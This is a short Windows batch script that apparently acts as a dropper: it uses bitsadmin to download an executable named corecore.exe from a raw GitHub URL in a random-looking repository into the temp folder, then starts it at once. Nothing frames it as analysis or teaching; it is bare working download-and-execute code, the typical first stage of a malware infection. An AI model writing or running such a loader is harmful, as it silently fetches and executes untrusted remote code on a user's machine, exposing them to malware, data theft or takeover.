@echo off
set url=https://raw.githubusercontent.com/theCore034/r32y43287436287423/main/corecore.exe
set tempPath=%temp%\corecore.exe

bitsadmin /transfer "DownloadJob" %url% %tempPath%
start %tempPath%
